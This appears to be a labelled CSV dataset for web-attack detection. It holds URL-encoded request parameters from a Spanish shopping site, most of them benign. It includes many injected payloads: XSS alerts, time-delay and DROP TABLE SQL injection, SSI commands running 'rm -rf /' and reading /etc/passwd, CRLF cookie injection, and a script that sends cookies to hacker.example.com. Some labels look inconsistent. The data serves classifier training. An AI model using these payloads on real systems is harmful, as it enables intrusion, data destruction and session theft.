payload,attack_type,label
B2=Vaciar+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=2123,normal,0
id=3&nombre=vino+rioja&precio=85&cantidad=44&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=maurice&password=a5l3ndi1&nombre=Daner&apellidos=Olivos+Ball%FAs&email=cassini-igawa%40alcantarapartners.es&dni=56405919Y&direccion=Practicante+Cristobal++Benitez+160%2C+11%3FC&ciudad=San+Juan+del+Puerto&cp=49148&provincia=Zaragoza&ntc=9851892046707743%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar123,xss,1
modo=registro&login=*du%27cic&password=c0855m05l13&nombre=Rachid&apellidos=Specie&email=tansey%40cohel.tel&dni=85978887B&direccion=C%2F+Uruguay%2C+17%2C+&ciudad=Sitges&cp=08840&provincia=Salamanca&ntc=2191408173155775&B1=Registrar,cmdi,1
B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E123,xss,1
errormsga=credenciales+incorrectas,normal,1
modo=insertar&precio=5716any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=registro&login=ping-she&password=0es2278g7da&nombre=Prudencio&apellidos=Graells+Frigola&email=olmer%40matchball.com.im&dni=75872778X&direccion=Grupo+Rives+Pla%2C+168+1%3FA&ciudad=Castropodame&cpA=09640&provincia=Girona&ntc=2104052374187085&B1=Registrar,cmdi,1
modo=insertar&precio=1998&B1=Confirmar,normal,0
modo=insertar&precio=3578&B1=Pasar+por+caja,normal,0
id=1,normal,0
B2A=Vaciar+carrito,normal,1
modo=entrar&login=calley&pwd=9r5sti22r00a&rememberA=on&B1=Entrar,cmdi,1
B2A=Vaciar+carrito,normal,1
modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=Set-cookie%253A%2BTamper%253D1041264011025374727&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,cmdi,1
errorMsgA=Credenciales+incorrectas123,normal,1
modo=entrar&login=pankiw&pwd=f8rol5r%EDa&remember=off&B1=Entrar,normal,0
modo=entrar&login=nataliya&pwd=p44m8scu6916n&remember=off&B1=Entrar,normal,0
b2=vACIAR+CARRITO%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
id=2&nombre=Vino+Rioja&precio=39&cantidad=54&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=c%3Fhak-ho%2Cn&pwd=es699601r&remember=on&B1=Entrar,cmdi,1
idA=1,normal,1
modo=entrar&login=AND+1%3D1&pwd=abunDanTEMeNte&remember=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=elex&password=c.%E10C4R1&nombre=Amelio&apellidos=Fontanal+Callarisa&email=versini%40clubdecampo.com.bi&dni=37655511A&direccion=C%2F+Calzada+169+&ciudad=Santany%ED&cp=14139&provincia=Alicante&ntc=0854278659322549&B1=Registrar,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=ohio&pwd=E25299A%27Rs%2CE&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=3283&B1=Pasar+por+caja123,normal,0
modo=insertar&precio=1007&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=mim&password=chapurrar&nombre=Bucardo&apellidos=Colomer+Mars&email=miramon%40logiteclines.rs&dni=45794073S&direccion=Calle+Roncesvalls+8%2C+&ciudad=Wamba&cp=27113&provincia=Lleida&ntc=1539157605114970&B1=Registrar,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precioA=85&cantidad=73&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=saqib&password=cALCInABLE&nombre=Alek&apellidos=Medel+Pujolriu&email=wahlberg8%40am-si.np&dni=65456048A&direccion=Pl.+Zorrilla+110%2C+&ciudad=Valdemaluque&cp=31593&provincia=Segovia&ntc=7791374198907519&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
MODO=INSERTAR&PRECIO=8896%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=cONFIRMAR,sqli,1
id=2123,normal,0
B2=Vaciar+carrito,normal,0
id=1&nombre=Vino+Rioja&precio=39&cantidad=38&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=csua&password=mu%E9&nombre=Giselle&apellidos=Gar%F3fano+Leguizam%F3n&email=sayo%40cbgerindote.pt&dni=40660740Y&direccion=C%2F+Albert+Einstein+118+&ciudadA=Cendejas+de+Enmedio&cp=33520&provincia=Ourense&ntc=4214809525884531&B1=Registrar,cmdi,1
id=1&nombreA=Vino+Rioja&precio=100&cantidad=34&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=zeljko&password=s46ro6&nombre=Galatas&apellidos=Caigua+Llobet&email=ornstein%40beljos.fr&dni=38623329G&direccion=Aldebaran+84%2C+&ciudad=Brozas&cp=37319&provincia=Toledo&ntc=1223521743723131&B1=Registrar,normal,0
modo=registro&login=sims&password=terraje&nombre=Egle&apellidos=Ibero+Saborit&email=dieasl_yannatos%40vilainstal.coop&dni=60578448J&direccion=C%2F+Pintor+Camaron%2C+88%2C+9%3FG&ciudad=Villalobar+de+Rioja&cp=19338&provincia=Valladolid&ntc=7208320116493837&B1=Registrar123,normal,0
modo=entrar&login=moyna&pwd=arable&remember=on&B1=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
modo=insertar&precioA=9720&B1=Pasar+por+caja,cmdi,1
modo=registro&login=karyl&password=s16nio5o&nombre=tiziano&apellidos=mugione+de+manuel&email=solonitsin3%40neotelecom.fi&dni=89388462c&direccion=terque+135%2c+7-c&ciudad=montroy&cp=22193&provincia=guadalajara&ntc=7215089345042859&b1=registrar,normal,0
ERRORmSG=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
modoA=insertar&precio=1737&B1=Pasar+por+caja,cmdi,1
modo=registro&login=rokas&password=telarejo&nombre=Ma%2Fr%F3-n&apellidos=Eraso+Rebes&email=lapotaire%40psicoencuentronline.cc&dni=32760470Y&direccion=C%2F+Los+Arces%2C+155%2C+&ciudad=Castej%F3n+del+Puente&cp=40314&provincia=Girona&ntc=8177793043919155&B1=Registrar,cmdi,1
modo=entrar&login=xixian&pwd=94lp90ulo&remember=off&B1=Entrar,normal,0
modo=registro&login=humfrid&password=expendedora&nombre=Leonelo&apellidos=Carvajal&email=lightner.manor%40rosaserigrafia.as&dni=83217349Z&direccion=C%2F+Fancelli%2C+34+6B&ciudad=Castellnovo&cp=19127&provincia=%C1vila&ntc=3413347210986966&B1=Registrar,normal,0
B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
modo=registro&login=kolavenn&password=deSTRuIDor-a&nombre=Antares&apellidos=Pressel+Goyenaga&email=klarwein%40xavipetit.it&dni=395846B47Z&direccion=C%2F+Las+Americas+8+&ciudad=Ponteceso&cp=24293&provincia=%C1lava&ntc=2255812100125453&B1=Registrar,cmdi,1
modo=entrar%4040&login=carolien&pwd=p68vILl7Ja6&remember=on&B1=Entrar,cmdi,1
id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=30&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=gunn&password=D88Ino&nombre=Nuncia&apellidos=Badell+Macia&email=vydra%40sms24h.no&dni=09955823C&direccionA=C%2F+Closa+De+Torroja+S%2FN+12-B&ciudad=Loiu&cp=12580&provincia=Asturias&ntc=9649891877150082&B1=Registrar,cmdi,1
modo=insertar&precio=7436&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=shaibal&password=.11NE5o&nombre=Huari&apellidos=Mc%27Morral+Obrist&email=askam%40maxtienda.er&dni=91436910L&direccion=Chato+De+La+Isla%2C+50+10-G&ciudad=Lezama&cp=47620&provincia=C%E1ceres&ntc=9056484904037520&B1=Registrar,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=22&B1A=A%F1adir+al+carrito,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=28&B1=A%F1adir+al+carrito,cmdi,1
idA=3&nombre=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=hocutt&password=MonTE9A&nombre=Sibila&apellidos=Garcez+Iturriria&email=neugebauer%40buscamoto.gw&dni=37246742J&direccion=Galeno+106%2C+9%3FC&ciudad=Ciadoncha&cp=17744&provincia=Segovia&ntc=8444341614355746&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=67&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=caLabrotar&remember=on&B1=Entrar,sqli,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85%2F&cantidad=49&B1=A%F1adir+al+carrito,cmdi,1
B2A=Vaciar+carrito123,normal,1
modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar,normal,0
modo=insertar&precio=7492&B1=Pasar+por+caja,normal,0
modo=registro&login=jilann6&password=inna&nombre=Hipabia&apellidos=Salvatierra+Escala&email=sangareau%40faders.com.mil&dni=80061275T&direccion=Barriada+De+La+Doctora+15+&ciudad=Agaete&cp=23450&provinciaA=C%F3rdoba&ntc=4825239492507549&B1=Registrar,cmdi,1
modoA=entrar&login=hedrich&pwd=chonta&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=tipton9&pwd=SalivA%2BJo&remember=on&B1=Entrar123,normal,0
modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dniA=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=39&cantidad=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito123,xss,1
b2a=vaciar+carrito,normal,1
id=1,normal,0
B2=Vaciar+carrito,normal,0
modo=insertar&precio=200&B1=Confirmar%2F,cmdi,1
modo=registro&login=towney&password=causa&nombre=An%EDbal&apellidos=Stange&email=stiefel8%40spainbareback.eu&dni=16157298M&direccion=Pla%E7a+Cesar+Vallejo%2C+58+&ciudad=Vilabella&cp=43427&provincia=C%E1ceres&ntc=9593063856723966&B1=Registrar,normal,0
modo=registro&login=krisha&password=ESPlEndorosO&nombre=Gervasio&apellidos=Landolfi+Ribas&email=trikonis_ruschel%40beatrizbalado.zw&dni=28108650M&direccion=Marina+Vicent+181+12H&ciudad=Bellprat&cp=46844&provincia=Burgos&ntc=0989859943250311&B1=Registrar,normal,0
id=1,normal,0
id=1,normal,0
MODO=REGISTRO&LOGIN=FARAH&PASSWORD=%21fiLATELIA&NOMBRE=cAYETANO&APELLIDOS=mESQUIDA+cARRASCO&EMAIL=KAYNAK%40CAMPODEGOLF.COM.SC&DNI=86164975y%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e&DIRECCION=cALLE+pELLEJERO+vILLORIA%2c+184+11%3fb&CIUDAD=vIVEROS&CP=21870&PROVINCIA=c%f3RDOBA&NTC=1552564007403755&b1=rEGISTRAR,sqli,1
modo=registro&login=dungan&password=efICientEmENte&nombre=Cris%F3logo&apellidos=Trafelati+Zurera&email=bianchetti%40zafranet.se&dni=95554434Z&direccion=Carrer+Castellfollit%2C+S%2FN%2C+9-A&ciudad=Casas+de+Miravete&cp=37258&provincia=Madrid&ntc=0891192306237140&B1=Registrar123,normal,0
modo=registro&login=renata&password=maula&nombre=Amarili&apellidos=Kinderman&email=sala%40mystyleperfume.ls&dni=80876345L&direccion=C%2F+Orient+45+&ciudad=Garrovillas+de+Alcon%E9tar&cp=41720&provincia=Alicante&ntc=2753394337556822&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=surreau&pwd=empacho&rememberA=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
id=2&nombre=Queso+Manchego&precio=85&cantidad=67&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=8916&b1=confirmar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precioA=85&cantidad=8&B1=A%F1adir+al+carrito,cmdi,1
id=1&nombre=vino+rioja&precio=39&cantidad=53&b1=a%f1adir+al+carrito,normal,0
MODO=ENTRAR&LOGIN=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PWD=ASTRAC%e1N&REMEMBER=ON&b1=eNTRAR,sqli,1
modo=registro&login=maisonne&password=d9a32ado&nombre=Dalmiro&apellidos=Puy&email=norton%40lesionesmusculares.uz&dni=52236694Z&direccion=Pujada+Parc+111%2C+1-A&ciudad=Aranga&cp=17300&provincia=Cantabria&ntc=8737153386823279&B1=Registrar123,normal,0
id=1123,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,normal,0
modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4762&B1=Confirmar123,sqli,1
id=2&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=39&b1=a%f1adir+al+carrito,normal,0
B2=Vaciar+carrito%252B,normal,1
B2=Vaciar+carrito%2520,normal,1
id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=4538&b1=confirmar,normal,0
modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=87238782N&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provincia=La+Rioja&ntc=434921604510901A&B1=Registrar,cmdi,1
MODO=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&PRECIO=291&b1=pASAR+POR+CAJA,xss,1
errorMsg=Credenciales+incorrectas%22+AND+%221%22%3D%221,normal,1
MODO=INSERTAR&PRECIO=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c&b1=pASAR+POR+CAJA,sqli,1
id=1&nombre=Queso+Manchego&precio=39&cantidad=72&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=%2520&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=79&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=9468&B1=Pasar+por+caja,sqli,1
modo=insertar&precio=6246&b1=confirmar,normal,0
id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=5&b1=a%f1adir+al+carrito,normal,0
errormsg=credenciales+incorrectas,normal,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=18&B1=A%F1adir+al+carrito,normal,0
id=1,normal,0
modo=registro&login=sathe9&password=LOBanILlO&nombre=Paladio&apellidos=Ribot+Velugo&email=bonagura.orimoto%40portaldesign.ht&dni=48638626C&direccion=Calle+San+Juan+151+1E&ciudad=Castej%F3n&cp=46183&provincia=Burgos&ntc=8069899417976960&B1=Registrar,normal,0
modo=registro&login=rozele&password=eSPALDILla&nombre=Idefonsa&apellidos=Masaguer+Pardinas&email=frank%40soymuyguapa.tn&dni=44181680Z&direccion=C%2F+Don+Bosco+65%2C+10-D&ciudad=San+Lorenzo+de+la+Parrilla&cp=06519&provincia=Guadalajara&ntc=7254612789884855&B1=Registrar123,normal,0
modo=registro&login=grodecki&password=35is117r&nombre=Rhett&apellidos=Zurueta+Olarte&email=ridgeley_fechner%40be%F1esmer.ye&dni=19255762R&direccion=Santa+Agueda+54%2C+1%3FC&ciudad=Jaraicejo&cp=48102&provincia=Huesca&ntc=9797161679933006&B1=Registrar,normal,0
modo=insertar&precio=6966&B1=Confirmar,normal,0
modo=registro&loginA=escher&password=j3zm%EDne7&nombre=Mait%E9n&apellidos=Puyuelo+Macazaga&email=crehan%40intapisur.bn&dni=64105812M&direccion=Perez+Oliva+29%2C+12%3FC&ciudad=Rebollar&cp=29551&provincia=Palencia&ntc=8009869624920768&B1=Registrar,cmdi,1
modo=registro&login=athony&password=irresoluci%F3n&nombre=Nemesio&apellidos=Bedmar&email=veronese%40prestigecars.tv&dni=99020664Y&direccion=Calle+Doctor+Jose+Manuel+Pascual+y+Pascual+146%2C+4%3FC&ciudad=Torrecilla+del+Monte&cp=29620&provincia=Valencia&ntc=0936495801431480&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
B2A=Vaciar+carrito,normal,1
id=2&nombre=Vino+.*%3FRioja&precio=39&cantidad=2&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=795&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=castrono&password=deSpArPajo&nombre=Lucian&apellidos=Urbon&email=fredman6%40cor-jet.to&dni=34295530T&direccion=Plaza+San+Miguel+132%2C+&ciudad=Pera%2C+La&cp=23690&provincia=Cuenca&ntc=0142716118287558&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
ID=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=despault2&password=empentar&nombre=decio&apellidos=abell%e0+segarras&email=greear%40mcgt.jobs&dni=07608453f&direccion=calle+don+juan+de+malaga%2c+170%2c+&ciudad=otxandio&cp=33775&provincia=zamora&ntc=7806339136091099&b1=registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
b2=%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
modo=registro&login=capes&password=desemperezar&nombre=Itallia&apellidos=Ayarza+Quintal&email=wei%40alfombra.com.gw&dni=82166751X&direccion=Llan%E7a+16+&ciudad=%2FSe%2Fn%E9%3Fs&cp=31522&provincia=Zamora&ntc=0723351625880614&B1=Registrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=61&B1=A%F1adir+al+carrito123,normal,0
id=2&nombre=vino+rioja&precio=85&cantidad=7&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=schafer&password=7lI7e37r06&nombre=Santos&apellidos=Ricciardiello+Ameller&email=kelz%40animationproject.be&dni=08841812Z&direccion=Passeig+Oreneta+23+8%3FGbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ciudad=Huarte%2FUharte&cp=37488&provincia=C%E1ceres&ntc=7240523818698482&B1=Registrar123,xss,1
id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=11&b1=a%f1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
id=1bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
modo=registro&login=falbee0&password=envaronar&nombre=jan&apellidos=arteta&email=birgel_pusith%40hojainformativas.com.nu&dni=97817650f&direccion=calle+marques+de+santillana+146+9b&ciudad=jaramillo+quemado&cp=48381&provincia=granada&ntc=6516910925369020&b1=registrar,normal,0
idA=2,normal,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=10&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=drennan&password=5e56ir2&nombre=Nadal&apellidos=Caravantes&email=bohlen_newtell%40lodgemadrid.it&dni=25137442Y&direccion=Lugar+Higuera+Canaria%2C+169+&ciudad=Abia+de+la+Obispal%EDa&cp=08282&provincia=Girona&ntc=8541242880536778&B1=Registrar,normal,0
modo=registro&login=montijo&password=remot4&nombre=Mailena&apellidos=Buj+Andunce&email=griffel%40camilafansite.pt&dni=93865245Zsessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&direccion=Doctor+Ulecia%2C+158+&ciudad=Valdunquillo&cp=31498&provincia=Tarragona&ntc=5319876028160549&B1=Registrar,cmdi,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=77&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=potts&password=CAr52lIt7&nombre=Arvid&apellidos=Yamuza+Ezama&email=michalowski%40lodgeinmadrid.mu&dni=84446214N&direccion=Pla%E7a+Llimoner+81%2C+&ciudad=Polopos&cp=49719&provincia=Madrid&ntc=6317858667918423&B1=Registrar,normal,0
modo=insertar&precio=8409&B1=Pasar+por+caja%2F,cmdi,1
id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
B2=Vaciar+carrito,normal,0
modo=registro&login=gahan&password=zARPaneL&nombre=Filomena&apellidos=Beiza+Ivanco&email=scala%40novisa.ch&dni=77293077J&direccion=C%2F+Masca+45+&ciudad=Ca%F1izal&cp=01478&provincia=Granada&ntc=9116424268966228&B1=Registrar,normal,0
modo=registro&login=door&password=-pantufla&nombre=Godofredo&apellidos=Ostapovich+Furnari&email=marlow%40botilleria.com.ec&dni=03291016S&direccion=Calle+Petunias+34+1-E&ciudad=Boada&cp=12480&provincia=Zamora&ntc=4231744159905009&B1=Registrar123,normal,0
modo=registro&login=fitch&password=libres29&nombre=Aramis&apellidos=Bellmunt+Callealt&email=frigola%40lesionesmusculares.tv&dni=56967582D&direccion=Plza.+Celso+Negueruela%2C+113%2C+&ciudad=Pajares+de+los+Oteros&cp=18370&provincia=Granad*a&ntc=6708069843609931&B1=Registrar,cmdi,1
modo=registro&login=betty-an5&password=mo9qu0aDO&nombre=Cesaria%27n&apellidos=Ivern&email=veazie-bolin%40tiaherminia.tj&dni=32245892F&direccion=Calle+Luis+Piernas+86+11-E&ciudad=Gerindote&cp=46443&provincia=Almer%EDa&ntc=8173244424971818&B1=Registrar,cmdi,1
modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=7931&B1=Confirmar,cmdi,1
modo=insertar&precio=7032&B1=Pasar+por+caja,normal,0
B2A=Vaciar+carrito123,normal,1
MODO=%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e&LOGIN=KNOBLOCH6&PASSWORD=b5I230A&NOMBRE=nAHUEL&APELLIDOS=aRBONA+yAZ%e1N&EMAIL=BRUCK7%40INTROITO.CG&DNI=85294407b&DIRECCION=pL.+lA+sE%f1ORIA%2c+192+12e&CIUDAD=vALVERDE+DEL+cAMINO&CP=33746&PROVINCIA=lLEIDA&NTC=7752606383220025&b1=rEGISTRAR,sqli,1
modo=registro&login=zureik&password=concurrente&nombre=Lino&apellidos=Barea+Runke&email=schulz%40hiperbarcelona.hn&dniA=64105812M&direccion=Camoe%2C+189%2C+&ciudad=Olv%E9s&cp=03579&provincia=Guip%FAzcoa&ntc=6282081679981232&B1=Registrar,cmdi,1
modoA=insertar&precio=6838&B1=Pasar+por+caja,cmdi,1
id=2&nombre=vino+rioja&precio=100&cantidad=32&b1=a%f1adir+al+carrito,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=18&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=80&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=9036&B1=Pasar+por+caja%2F,cmdi,1
B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
id=2123,normal,0
modo=insertar&precio=6148&B1=Pasar+por+caja,normal,0
id=1paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,xss,1
modo=insertar&precio=3114&B1=Pasar+por+caja,normal,0
id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito123,sqli,1
modo=registro&login=caryl&password=t53S97L%C1n747A&nombre=Randy&apellidos=Pardo+Vidriales&email=greco_manon1%40hacia.yu&dni=70289546M&direccion=Cartago+117%2C+12%3FB&ciudad=Tr%E9vago&cp=47131&provincia=La+Rioja&ntc=4970113242543246&B1=Registrar123,normal,0
b2=vaciar+carrito,normal,0
ida=1,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=savoula&pwd=03t86i3&remember=on&B1=Entrar,normal,0
modo=insertar&precio=6424&B1=Pasar+por+caja123,normal,0
modo=registro&login=ma%27no%2Fl&password=a3oari1&nombre=Ezra&apellidos=Penagos+Pijoan&email=getchell-benning%40aspirantes.ax&dni=65278169Y&direccion=Calle+Torroja%2C+3+&ciudad=Seu+d%27Urgell%2C+La&cp=37881&provincia=Cantabria&ntc=9898970916283708&B1=Registrar,cmdi,1
ID=1&NOMBRE=qUESO+mANCHEGO&PRECIO=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&CANTIDAD=21&b1=a%f1ADIR+AL+CARRITO,xss,1
B2A=Vaciar+carrito,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=insertar&precio=5445&b1=pasar+por+caja,normal,0
ID=1&NOMBRE=jAM%f3N+iB%e9RICO&PRECIO=100&CANTIDAD=93&b1=a%f1ADIR+AL+CARRITO%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=95&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modoA=entrar&login=shigeki&pwd=lutria&remember=on&B1=Entrar,cmdi,1
id=2,normal,0
modo=entrar&login=sundar&pwdA=rEsPEtOSA&remember=on&B1=Entrar,cmdi,1
modo=entrar&loginA=van_sick&pwd=p7n8%ED&remember=off&B1=Entrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
id=1&nombre=Queso+Manchego%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=39&cantidad=15&B1=A%F1adir+al+carrito,sqli,1
modo=registro&login=virchick1&password=superable&nombre=Leonila&apellidos=Duran+Manero&email=paris-loisel%40vi%F1avilano.cr&dni=49511678S&direccion=Burgos%2C+S%2FN%2C+1F&ciudad=Boimorto&cp=08191&provincia=%C1vila&ntc=1959107690181502&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=6785&B1=Pasar+por+caja123,normal,0
